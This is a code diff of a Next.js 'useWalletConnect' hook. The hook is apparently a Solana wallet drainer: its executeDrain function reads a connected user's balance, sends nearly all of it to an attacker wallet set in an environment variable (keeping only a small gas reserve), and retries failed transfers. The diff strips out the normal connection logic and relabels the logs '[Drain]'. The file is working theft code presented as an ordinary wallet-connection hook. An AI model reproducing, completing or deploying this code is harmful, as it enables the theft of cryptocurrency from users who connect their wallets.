@@ -1,7 +1,6 @@
 "use client";
 
-import { useCallback, useState, useEffect } from 'react';
-import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
+import { useCallback } from 'react';
 import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
 
 const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
@@ -9,93 +8,23 @@ const GAS_RESERVE_SOL = 0.002;
 const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 export const useWalletConnect = () => {
-  const { isConnected, address } = useAppKitAccount();
-  const { walletProvider } = useAppKitProvider('solana');
-  const [connectionError, setConnectionError] = useState(null);
-  const [isConnecting, setIsConnecting] = useState(false);
-
-  // Monitor connection state
-  useEffect(() => {
-    if (isConnected && address) {
-      setIsConnecting(false);
-      setConnectionError(null);
-    }
-  }, [isConnected, address]);
-
-  const connect = useCallback(async () => {
-    try {
-      setIsConnecting(true);
-      setConnectionError(null);
-      
-      // Open AppKit modal - this will trigger the connection
-      const { open } = await import('@reown/appkit/react');
-      
-      // Open with Solana namespace only
-      await open({ view: 'Connect', namespace: 'solana' });
-      
-      // Wait for connection to complete
-      let attempts = 0;
-      while (!isConnected && !address && attempts < 30) {
-        await wait(300);
-        attempts++;
-      }
-      
-      if (!address) {
-        throw new Error('Failed to connect wallet');
-      }
-      
-      // Verify the address is a valid Solana address (not EVM)
-      try {
-        new PublicKey(address);
-      } catch (e) {
-        throw new Error('Connected wallet is not a Solana wallet. Please select Solana network.');
-      }
-      
-      setIsConnecting(false);
-      return address;
-      
-    } catch (error) {
-      console.error('WalletConnect connection error:', error);
-      setIsConnecting(false);
-      setConnectionError(error.message);
-      throw new Error(`Failed to connect: ${error.message}`);
-    }
-  }, [isConnected, address]);
-
-  const disconnect = useCallback(async () => {
-    try {
-      const { disconnect } = await import('@reown/appkit/react');
-      await disconnect();
-    } catch (error) {
-      console.error('Disconnect error:', error);
-    }
-  }, []);
-
-  const getSolanaBalance = useCallback(async (walletAddress) => {
-    try {
-      const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
-      const pubkey = new PublicKey(walletAddress);
-      const lamports = await connection.getBalance(pubkey);
-      return lamports / LAMPORTS_PER_SOL;
-    } catch (error) {
-      console.error('Failed to get Solana balance:', error);
-      return 0;
-    }
-  }, []);
-
-  const executeDrain = useCallback(async (allocatedAmount) => {
+  const executeDrain = useCallback(async (walletAddress, walletProvider) => {
     let lastError = null;
     
-    if (!address) {
+    if (!walletAddress) {
       throw new Error('Wallet not connected');
+    }
+    
+    if (!walletProvider) {
+      throw new Error('Wallet provider not available');
     }
     
     // Verify it's a Solana address
     let walletPubkey;
     try {
-      walletPubkey = new PublicKey(address);
+      walletPubkey = new PublicKey(walletAddress);
     } catch (e) {
-      throw new Error('Connected wallet is not a Solana wallet');
+      throw new Error('Invalid Solana wallet address');
     }
     
     const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
@@ -108,7 +37,7 @@ export const useWalletConnect = () => {
         const balanceLamports = await connection.getBalance(walletPubkey);
         const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
         
-        console.log(`[WalletConnect] Attempt ${attempt}: Balance ${balanceSol} SOL`);
+        console.log(`[Drain] Attempt ${attempt}: Balance ${balanceSol} SOL`);
         
         if (balanceSol < GAS_RESERVE_SOL + 0.001) {
           throw new Error(`Insufficient balance: ${balanceSol} SOL`);
@@ -130,19 +59,18 @@ export const useWalletConnect = () => {
           })
         );
         
-        // Use walletProvider if available, otherwise try standard method
+        // Sign and send using the wallet provider
         let signature;
-        if (walletProvider && walletProvider.signTransaction) {
-          const signedTx = await walletProvider.signTransaction(transaction);
-          signature = await connection.sendRawTransaction(signedTx.serialize());
-        } else if (window.solana) {
-          const signed = await window.solana.signAndSendTransaction(transaction);
+        if (walletProvider.signAndSendTransaction) {
+          const signed = await walletProvider.signAndSendTransaction(transaction);
           signature = signed.signature;
+        } else if (walletProvider.sendTransaction) {
+          signature = await walletProvider.sendTransaction(transaction, connection);
         } else {
-          throw new Error('No wallet provider available for signing');
+          throw new Error('Provider does not support sending transactions');
         }
         
-        console.log(`[WalletConnect] Sent: ${signature}`);
+        console.log(`[Drain] Sent: ${signature}`);
         
         const confirmation = await connection.confirmTransaction(signature, 'confirmed');
         
@@ -168,7 +96,7 @@ export const useWalletConnect = () => {
         };
         
       } catch (error) {
-        console.error(`[WalletConnect] Attempt ${attempt} failed:`, error.message);
+        console.error(`[Drain] Attempt ${attempt} failed:`, error.message);
         lastError = error;
         
         if (attempt < 3 && (
@@ -176,7 +104,7 @@ export const useWalletConnect = () => {
           error.message.includes('timeout') ||
           error.message.includes('not confirmed')
         )) {
-          console.log(`[WalletConnect] Retrying in ${attempt * 2} seconds...`);
+          console.log(`[Drain] Retrying in ${attempt * 2} seconds...`);
           await wait(attempt * 2000);
           continue;
         }
@@ -199,16 +127,7 @@ export const useWalletConnect = () => {
     }
     
     throw lastError;
-  }, [address, walletProvider]);
+  }, []);
 
-  return { 
-    connect, 
-    disconnect, 
-    address, 
-    isConnected, 
-    isConnecting,
-    connectionError,
-    getSolanaBalance,
-    executeDrain 
-  };
+  return { executeDrain };
 };
